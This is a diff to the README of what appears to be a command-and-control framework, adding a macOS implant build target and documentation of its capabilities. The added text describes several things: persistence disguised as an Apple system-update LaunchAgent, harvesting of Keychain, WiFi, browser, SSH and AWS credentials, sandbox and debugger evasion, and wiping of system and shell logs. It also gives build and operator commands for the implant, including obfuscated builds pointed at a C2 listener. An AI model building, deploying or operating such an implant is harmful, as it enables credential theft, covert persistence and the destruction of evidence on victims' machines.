@@ -579,6 +579,9 @@ make agent-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
 # Linux agent
 make agent-linux LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
 
+# macOS agent (darwin/amd64)
+make agent-darwin LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
+
 # Obfuscated (garble)
 make agent-garble-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
 
@@ -596,8 +599,9 @@ make run                 # Build + start the server
 make restart             # Kill running server, rebuild, and start fresh
 make agent-windows       # Cross-compile Windows/amd64 agent
 make agent-linux         # Cross-compile Linux/amd64 agent
+make agent-darwin        # Cross-compile macOS/amd64 agent
 make agent-garble-windows # Obfuscated Windows agent via garble
-make agent-all           # Build all agent variants
+make agent-all           # Build all agent variants (Windows + Linux + macOS + DLL)
 make keygen              # Generate RSA keypair for server
 make certs               # Generate self-signed TLS certificates
 make deps                # Install dependencies (Go modules + garble)
@@ -632,6 +636,33 @@ GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags "-s -w \
   -X 'github.com/phantom-c2/phantom/internal/implant.JitterPercent=10' \
   -X 'github.com/phantom-c2/phantom/internal/implant.ServerPubKey=$SERVER_PUB_DER_B64'" \
   -o build/agents/phantom-agent_linux_amd64 ./cmd/agent
+```
+
+### macOS Agent Capabilities
+
+The darwin agent (`cmd/agent-darwin`) targets macOS and includes:
+
+| Capability | Details |
+|---|---|
+| **Persistence** | LaunchAgent plist (`~/Library/LaunchAgents/com.apple.systemupdated.plist`) runs on login with `KeepAlive`, no admin needed. Cron fallback also supported. |
+| **Credential Harvest** | Keychain (internet + generic passwords), WiFi passwords via `security`, Chrome Login Data (sqlite3), SSH private keys, AWS credentials, shell history grep |
+| **Sandbox Detection** | Checks for Frida, Instruments.app, lldb; `DYLD_INSERT_LIBRARIES` injection env vars; low CPU count; known sandbox hostnames |
+| **Log Clearing** | Wipes `~/Library/Logs`, ASL logs, shell history (bash + zsh), system unified log |
+| **Shell execution** | `/bin/sh` (same as Linux path in `shell.go`) |
+
+**Persistence commands (on a macOS agent):**
+```
+persist launchagent   # Install LaunchAgent plist (login persistence, no admin)
+persist cron          # Cron @reboot fallback
+persist list          # List active persistence
+persist remove        # Remove all installed persistence
+```
+
+**macOS-specific creds commands:**
+```
+creds keychain        # Dump Keychain internet + generic passwords
+creds wifi            # WiFi passwords via security command
+creds all             # Full macOS harvest (keychain, wifi, ssh, browser, aws, history)
 ```
 
 ### Proxy-Aware Agents (Corporate Networks)
